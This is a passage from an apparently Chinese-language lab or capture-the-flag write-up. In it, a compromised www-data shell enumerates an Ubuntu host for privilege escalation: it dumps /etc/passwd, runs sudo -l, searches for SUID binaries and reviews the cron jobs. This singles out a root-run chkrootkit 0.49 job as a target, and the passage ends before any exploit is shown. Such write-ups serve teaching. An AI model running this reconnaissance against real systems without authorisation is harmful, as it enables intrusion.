+</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/bin/sh
+</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/bin/sh
+</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class=line><span class=cl>games:x:5:60:games:/usr/games:/bin/sh
+</span></span><span class=line><span class=cl>man:x:6:12:man:/var/cache/man:/bin/sh
+</span></span><span class=line><span class=cl>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span></span><span class=line><span class=cl>mail:x:8:8:mail:/var/mail:/bin/sh
+</span></span><span class=line><span class=cl>news:x:9:9:news:/var/spool/news:/bin/sh
+</span></span><span class=line><span class=cl>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span></span><span class=line><span class=cl>proxy:x:13:13:proxy:/bin:/bin/sh
+</span></span><span class=line><span class=cl>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span></span><span class=line><span class=cl>backup:x:34:34:backup:/var/backups:/bin/sh
+</span></span><span class=line><span class=cl>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span></span><span class=line><span class=cl>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span></span><span class=line><span class=cl>gnats:x:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/bin/sh
+</span></span><span class=line><span class=cl>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span></span><span class=line><span class=cl>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span></span><span class=line><span class=cl>syslog:x:101:103::/home/syslog:/bin/false
+</span></span><span class=line><span class=cl>messagebus:x:102:104::/var/run/dbus:/bin/false
+</span></span><span class=line><span class=cl>john:x:1000:1000:Ubuntu 12.x,,,:/home/john:/bin/bash
+</span></span><span class=line><span class=cl>sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+</span></span></code></pre></td></tr></table></div></div><p>john:x:1000:1000:Ubuntu 12.x,,,:/home/john:/bin/bash</p><p>john 是唯一一个 UID 1000 的普通用户，有家目录 /home/john，能登录 bash。</p><h3 id=看看john目录下有什么文件>看看john目录下有什么文件</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@ubuntu:/$ ls -la /var/www
+</span></span><span class=line><span class=cl>ls -la /var/www
+</span></span><span class=line><span class=cl>total <span class=m>64</span>
+</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>3</span> root     root      <span class=m>4096</span> Apr <span class=m>25</span>  <span class=m>2016</span> .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>12</span> root     root      <span class=m>4096</span> Apr <span class=m>26</span>  <span class=m>2016</span> ..
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root     root     <span class=m>46878</span> Apr <span class=m>25</span>  <span class=m>2016</span> blow.jpg
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root     root       <span class=m>163</span> Apr <span class=m>25</span>  <span class=m>2016</span> index.php
+</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> www-data www-data  <span class=m>4096</span> Sep <span class=m>28</span> 02:26 <span class=nb>test</span>
+</span></span><span class=line><span class=cl>www-data@ubuntu:/$ ls -la /home/john
+</span></span><span class=line><span class=cl>ls -la /home/john
+</span></span><span class=line><span class=cl>total <span class=m>28</span>
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> john john <span class=m>4096</span> Apr <span class=m>12</span>  <span class=m>2016</span> .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> root root <span class=m>4096</span> Mar <span class=m>30</span>  <span class=m>2016</span> ..
+</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> john john   <span class=m>61</span> Apr <span class=m>26</span>  <span class=m>2016</span> .bash_history
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> john john  <span class=m>220</span> Mar <span class=m>30</span>  <span class=m>2016</span> .bash_logout
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> john john <span class=m>3486</span> Mar <span class=m>30</span>  <span class=m>2016</span> .bashrc
+</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> john john <span class=m>4096</span> Mar <span class=m>30</span>  <span class=m>2016</span> .cache
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> john john  <span class=m>675</span> Mar <span class=m>30</span>  <span class=m>2016</span> .profile
+</span></span></code></pre></td></tr></table></div></div><h2 id=尝试提权>尝试提权</h2><h3 id=sudo提权失败>sudo提权失败</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@ubuntu:/$ sudo -l
+</span></span><span class=line><span class=cl>sudo -l
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> www-data:
+</span></span></code></pre></td></tr></table></div></div><p>需要密码走不通</p><h3 id=suid-提权失败>suid 提权失败</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@ubuntu:/$ find / -perm -4000 -type f 2&gt;/dev/null
+</span></span><span class=line><span class=cl>find / -perm -4000 -type f 2&gt;/dev/null
+</span></span><span class=line><span class=cl>/usr/sbin/pppd
+</span></span><span class=line><span class=cl>/usr/sbin/uuidd
+</span></span><span class=line><span class=cl>/usr/lib/eject/dmcrypt-get-device
+</span></span><span class=line><span class=cl>/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>/usr/lib/pt_chown
+</span></span><span class=line><span class=cl>/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+</span></span><span class=line><span class=cl>/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+</span></span><span class=line><span class=cl>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>/usr/bin/sudoedit
+</span></span><span class=line><span class=cl>/usr/bin/traceroute6.iputils
+</span></span><span class=line><span class=cl>/usr/bin/sudo
+</span></span><span class=line><span class=cl>/usr/bin/chsh
+</span></span><span class=line><span class=cl>/usr/bin/passwd
+</span></span><span class=line><span class=cl>/usr/bin/chfn
+</span></span><span class=line><span class=cl>/usr/bin/at
+</span></span><span class=line><span class=cl>/usr/bin/mtr
+</span></span><span class=line><span class=cl>/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>/usr/bin/newgrp
+</span></span><span class=line><span class=cl>/bin/mount
+</span></span><span class=line><span class=cl>/bin/ping6
+</span></span><span class=line><span class=cl>/bin/fusermount
+</span></span><span class=line><span class=cl>/bin/umount
+</span></span><span class=line><span class=cl>/bin/ping
+</span></span><span class=line><span class=cl>/bin/su
+</span></span></code></pre></td></tr></table></div></div><p>全是系统默认</p><h3 id=尝试cron-枚举>尝试cron 枚举</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@ubuntu:/$ cat /etc/crontab
+</span></span><span class=line><span class=cl>cat /etc/crontab
+</span></span><span class=line><span class=cl><span class=c1># /etc/crontab: system-wide crontab</span>
+</span></span><span class=line><span class=cl><span class=c1># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1># command to install the new version when you edit this file</span>
+</span></span><span class=line><span class=cl><span class=c1># and files in /etc/cron.d. These files also have username fields,</span>
+</span></span><span class=line><span class=cl><span class=c1># that none of the other crontabs do.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>SHELL</span><span class=o>=</span>/bin/sh
+</span></span><span class=line><span class=cl><span class=nv>PATH</span><span class=o>=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># m h dom mon dow user  command</span>
+</span></span><span class=line><span class=cl><span class=m>17</span> *    * * *   root    <span class=nb>cd</span> / <span class=o>&amp;&amp;</span> run-parts --report /etc/cron.hourly
+</span></span><span class=line><span class=cl><span class=m>25</span> <span class=m>6</span>    * * *   root    <span class=nb>test</span> -x /usr/sbin/anacron <span class=o>||</span> <span class=o>(</span> <span class=nb>cd</span> / <span class=o>&amp;&amp;</span> run-parts --report /etc/cron.daily <span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>47</span> <span class=m>6</span>    * * <span class=m>7</span>   root    <span class=nb>test</span> -x /usr/sbin/anacron <span class=o>||</span> <span class=o>(</span> <span class=nb>cd</span> / <span class=o>&amp;&amp;</span> run-parts --report /etc/cron.weekly <span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>52</span> <span class=m>6</span>    <span class=m>1</span> * *   root    <span class=nb>test</span> -x /usr/sbin/anacron <span class=o>||</span> <span class=o>(</span> <span class=nb>cd</span> / <span class=o>&amp;&amp;</span> run-parts --report /etc/cron.monthly <span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>没有自定义目录，再看看其他的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@ubuntu:/$ ls -la /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly
+</span></span><span class=line><span class=cl>&lt;y /etc/cron.daily /etc/cron.weekly /etc/cron.monthly                        
+</span></span><span class=line><span class=cl>ls: cannot open directory /etc/cron.d: Permission denied
+</span></span><span class=line><span class=cl>/etc/cron.daily:
+</span></span><span class=line><span class=cl>total <span class=m>72</span>
+</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> root root  <span class=m>4096</span> Apr <span class=m>12</span>  <span class=m>2016</span> .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>84</span> root root  <span class=m>4096</span> Sep <span class=m>28</span>  <span class=m>2026</span> ..
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root   <span class=m>102</span> Jun <span class=m>19</span>  <span class=m>2012</span> .placeholder
+</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> root root <span class=m>15399</span> Nov <span class=m>15</span>  <span class=m>2013</span> apt
+</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> root root   <span class=m>314</span> Apr <span class=m>18</span>  <span class=m>2013</span> aptitude
+</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> root root   <span class=m>502</span> Mar <span class=m>31</span>  <span class=m>2012</span> bsdmainutils
+</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> root root  <span class=m>2032</span> Jun  <span class=m>4</span>  <span class=m>2014</span> chkrootkit
+</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> root root   <span class=m>256</span> Oct <span class=m>14</span>  <span class=m>2013</span> dpkg
+</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> root root   <span class=m>338</span> Dec <span class=m>20</span>  <span class=m>2011</span> lighttpd
+</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> root root   <span class=m>372</span> Oct  <span class=m>4</span>  <span class=m>2011</span> logrotate
+</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> root root  <span class=m>1365</span> Dec <span class=m>28</span>  <span class=m>2012</span> man-db
+</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> root root   <span class=m>606</span> Aug <span class=m>17</span>  <span class=m>2011</span> mlocate
+</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> root root   <span class=m>249</span> Sep <span class=m>12</span>  <span class=m>2012</span> passwd
+</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> root root  <span class=m>2417</span> Jul  <span class=m>1</span>  <span class=m>2011</span> popularity-contest
+</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> root root  <span class=m>2947</span> Jun <span class=m>19</span>  <span class=m>2012</span> standard
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/etc/cron.hourly:
+</span></span><span class=line><span class=cl>total <span class=m>12</span>
+</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> root root <span class=m>4096</span> Mar <span class=m>30</span>  <span class=m>2016</span> .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>84</span> root root <span class=m>4096</span> Sep <span class=m>28</span>  <span class=m>2026</span> ..
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root  <span class=m>102</span> Jun <span class=m>19</span>  <span class=m>2012</span> .placeholder
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/etc/cron.monthly:
+</span></span><span class=line><span class=cl>total <span class=m>12</span>
+</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> root root <span class=m>4096</span> Mar <span class=m>30</span>  <span class=m>2016</span> .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>84</span> root root <span class=m>4096</span> Sep <span class=m>28</span>  <span class=m>2026</span> ..
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root  <span class=m>102</span> Jun <span class=m>19</span>  <span class=m>2012</span> .placeholder
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/etc/cron.weekly:
+</span></span><span class=line><span class=cl>total <span class=m>20</span>
+</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> root root <span class=m>4096</span> Mar <span class=m>30</span>  <span class=m>2016</span> .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>84</span> root root <span class=m>4096</span> Sep <span class=m>28</span>  <span class=m>2026</span> ..
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root  <span class=m>102</span> Jun <span class=m>19</span>  <span class=m>2012</span> .placeholder
+</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> root root  <span class=m>730</span> Sep <span class=m>13</span>  <span class=m>2013</span> apt-xapian-index
+</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> root root  <span class=m>907</span> Dec <span class=m>28</span>  <span class=m>2012</span> man-db
+</span></span></code></pre></td></tr></table></div></div><p>注意这个文件：chkrootkit</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=m>25</span> <span class=m>6</span>    * * *   root    <span class=nb>test</span> -x /usr/sbin/anacron <span class=o>||</span> <span class=o>(</span> <span class=nb>cd</span> / <span class=o>&amp;&amp;</span> run-parts --report /etc/cron.daily <span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>这行说明：/etc/cron.daily/ 里的所有脚本，每天由 root 身份自动执行一次</p><h3 id=对这个工具进行信息收集>对这个工具进行信息收集</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@ubuntu:/$ ls -l /etc/cron.daily/chkrootkit
+</span></span><span class=line><span class=cl>ls -l /etc/cron.daily/chkrootkit
+</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root <span class=m>2032</span> Jun  <span class=m>4</span>  <span class=m>2014</span> /etc/cron.daily/chkrootkit
+</span></span><span class=line><span class=cl>www-data@ubuntu:/$ head -n <span class=m>30</span> /etc/cron.daily/chkrootkit
+</span></span><span class=line><span class=cl>head -n <span class=m>30</span> /etc/cron.daily/chkrootkit
+</span></span><span class=line><span class=cl><span class=c1>#!/bin/sh</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>set</span> -e
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>CHKROOTKIT</span><span class=o>=</span>/usr/sbin/chkrootkit
+</span></span><span class=line><span class=cl><span class=nv>CF</span><span class=o>=</span>/etc/chkrootkit.conf
+</span></span><span class=line><span class=cl><span class=nv>LOG_DIR</span><span class=o>=</span>/var/log/chkrootkit
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> ! -x <span class=nv>$CHKROOTKIT</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>  <span class=nb>exit</span> <span class=m>0</span>
+</span></span><span class=line><span class=cl><span class=k>fi</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -f <span class=nv>$CF</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>    . <span class=nv>$CF</span>
+</span></span><span class=line><span class=cl><span class=k>fi</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$RUN_DAILY</span><span class=s2>&#34;</span> <span class=o>=</span> <span class=s2>&#34;true&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$DIFF_MODE</span><span class=s2>&#34;</span> <span class=o>=</span> <span class=s2>&#34;true&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>                                <span class=nb>eval</span> <span class=nv>$CHKROOTKIT</span> <span class=nv>$RUN_DAILY_OPTS</span> &gt; <span class=nv>$LOG_DIR</span>/log.today.raw 2&gt;<span class=p>&amp;</span><span class=m>1</span>
+</span></span><span class=line><span class=cl>                                <span class=c1># the sed expression replaces the messages about /sbin/dhclient3 /usr/sbin/dhcpd3</span>
+</span></span><span class=line><span class=cl>                                <span class=c1># with a message that is the same whatever order eth0 and eth1 were scanned</span>
+</span></span><span class=line><span class=cl>                                sed -r -e <span class=s1>&#39;s,eth(0|1)(:[0-9])?: PACKET SNIFFER\((/sbin/dhclient3|/usr/sbin/dhcpd3)\[[0-9]+\]\),eth\[0|1\]: PACKET SNIFFER\([dhclient3|dhcpd3]{PID}\),&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>                                -e <span class=s1>&#39;s/(! \w+\s+)[ 0-9]{4}[0-9]/\1#####/&#39;</span> <span class=nv>$LOG_DIR</span>/log.today.raw &gt; <span class=nv>$LOG_DIR</span>/log.today
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>[</span> ! -f <span class=nv>$LOG_DIR</span>/log.expected <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>                                                <span class=nb>echo</span> <span class=s2>&#34;ERROR: No file </span><span class=nv>$LOG_DIR</span><span class=s2>/log.expected&#34;</span>
+</span></span><span class=line><span class=cl>                                                <span class=nb>echo</span> <span class=s2>&#34;This file should contain expected output from chkrootkit&#34;</span>
+</span></span><span class=line><span class=cl>                                                <span class=nb>echo</span>
+</span></span><span class=line><span class=cl>                                                <span class=nb>echo</span> <span class=s2>&#34;Today&#39;s run produced the following output:&#34;</span>
+</span></span><span class=line><span class=cl>                                                <span class=nb>echo</span> <span class=s2>&#34;--- [ BEGIN: cat </span><span class=nv>$LOG_DIR</span><span class=s2>/log.today  ] ---&#34;</span>
+</span></span><span class=line><span class=cl>                                                cat <span class=nv>$LOG_DIR</span>/log.today
+</span></span><span class=line><span class=cl>www-data@ubuntu:/$ chkrootkit -V 2&gt;/dev/null
+</span></span><span class=line><span class=cl>chkrootkit -V 2&gt;/dev/null
+</span></span><span class=line><span class=cl>www-data@ubuntu:/$ cat /etc/chkrootkit.conf
+</span></span><span class=line><span class=cl>cat /etc/chkrootkit.conf
+</span></span><span class=line><span class=cl><span class=nv>RUN_DAILY</span><span class=o>=</span><span class=s2>&#34;false&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>RUN_DAILY_OPTS</span><span class=o>=</span><span class=s2>&#34;-q&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>DIFF_MODE</span><span class=o>=</span><span class=s2>&#34;false&#34;</span>
+</span></span><span class=line><span class=cl>www-data@ubuntu:/$ ls -l /etc/chkrootkit.conf
+</span></span><span class=line><span class=cl>ls -l /etc/chkrootkit.conf
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root <span class=m>56</span> Apr <span class=m>12</span>  <span class=m>2016</span> /etc/chkrootkit.conf
+</span></span></code></pre></td></tr></table></div></div><p>/etc/chkrootkit.conf 是 root:root 644，www-data 不可写，所以改配置这条路也断了</p><p>纠正其中一条命令错误</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@ubuntu:/$ /usr/sbin/chkrootkit -V
+</span></span><span class=line><span class=cl>/usr/sbin/chkrootkit -V
+</span></span><span class=line><span class=cl>chkrootkit version 0.49
+</span></span></code></pre></td></tr></table></div></div><p>输出是空的。为什么？</p><p>因为 chkrootkit 的二进制不在 www-data 的 PATH 里。它的完整路径是 /usr/sbin/chkrootkit，而 www-data 的 PATH 里可能没有 /usr/sbin</p><p>再看看脚本全部内容</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@ubuntu:/$ cat -n /etc/cron.daily/chkrootkit
+</span></span><span class=line><span class=cl>cat -n /etc/cron.daily/chkrootkit
+</span></span><span class=line><span class=cl>     <span class=m>1</span>  <span class=c1>#!/bin/sh</span>
+</span></span><span class=line><span class=cl>     <span class=m>2</span>
+</span></span><span class=line><span class=cl>     <span class=m>3</span>  <span class=nb>set</span> -e
+</span></span><span class=line><span class=cl>     <span class=m>4</span>
+</span></span><span class=line><span class=cl>     <span class=m>5</span>  <span class=nv>CHKROOTKIT</span><span class=o>=</span>/usr/sbin/chkrootkit
+</span></span><span class=line><span class=cl>     <span class=m>6</span>  <span class=nv>CF</span><span class=o>=</span>/etc/chkrootkit.conf
+</span></span><span class=line><span class=cl>     <span class=m>7</span>  <span class=nv>LOG_DIR</span><span class=o>=</span>/var/log/chkrootkit
+</span></span><span class=line><span class=cl>     <span class=m>8</span>
+</span></span><span class=line><span class=cl>     <span class=m>9</span>  <span class=k>if</span> <span class=o>[</span> ! -x <span class=nv>$CHKROOTKIT</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>    <span class=m>10</span>    <span class=nb>exit</span> <span class=m>0</span>
+</span></span><span class=line><span class=cl>    <span class=m>11</span>  <span class=k>fi</span>
+</span></span><span class=line><span class=cl>    <span class=m>12</span>
+</span></span><span class=line><span class=cl>    <span class=m>13</span>  <span class=k>if</span> <span class=o>[</span> -f <span class=nv>$CF</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>    <span class=m>14</span>      . <span class=nv>$CF</span>
+</span></span><span class=line><span class=cl>    <span class=m>15</span>  <span class=k>fi</span>
+</span></span><span class=line><span class=cl>    <span class=m>16</span>
+</span></span><span class=line><span class=cl>    <span class=m>17</span>  <span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$RUN_DAILY</span><span class=s2>&#34;</span> <span class=o>=</span> <span class=s2>&#34;true&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
